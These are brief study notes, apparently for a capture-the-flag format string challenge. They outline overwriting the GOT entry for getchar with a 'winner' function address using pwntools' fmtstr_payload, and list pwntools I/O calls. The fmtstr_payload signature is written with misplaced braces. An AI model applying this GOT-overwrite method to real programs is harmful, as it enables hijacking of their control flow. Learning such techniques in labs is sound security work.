Process Steps & Goal Statement :

1. Get the addresses of the winner function + getchar function.
2. Store them in variables such that thhey are represented as Integers.
3. Get the offset that the functions are located in GOT.
4. Define the payload with the format string library of pwntools.

Pwntools Functions : 
- io.recvline() - Receives output in one single line
- io.recv() - Receives the following output (can be many lines)
- io.sendline() - Sends something in one line 
- line() involves a \n in the end
- pwn.fmtstr_payload(offset,{address overwritten(int) : address overwriting (int), write_size='short'})
- You can save output from one line like this - x = io.recvline()

- offset is the difference between the format string specifier & the defined variables stored on the stack, which in this case is 1.
